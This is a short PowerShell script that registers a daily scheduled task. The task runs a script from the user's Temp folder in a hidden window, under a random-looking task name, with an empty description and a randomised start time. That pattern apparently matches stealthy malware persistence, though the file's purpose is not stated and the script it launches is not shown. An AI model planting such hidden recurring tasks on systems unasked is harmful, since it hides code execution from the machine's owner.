$trigger =  New-ScheduledTaskTrigger -Daily -At ((Get-Date) + (New-TimeSpan -Minutes (360-(Get-Random -Maximum 360 -Minimum 60))))
 
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' `
 -Argument '-NoProfile -WindowStyle Hidden -command "%userprofile%\AppData\Local\Temp\runrads.ps1"'

Register-ScheduledTask `
 -Action $action `
 -Trigger $trigger `
 -TaskName "a23eaa" `
 -Description ""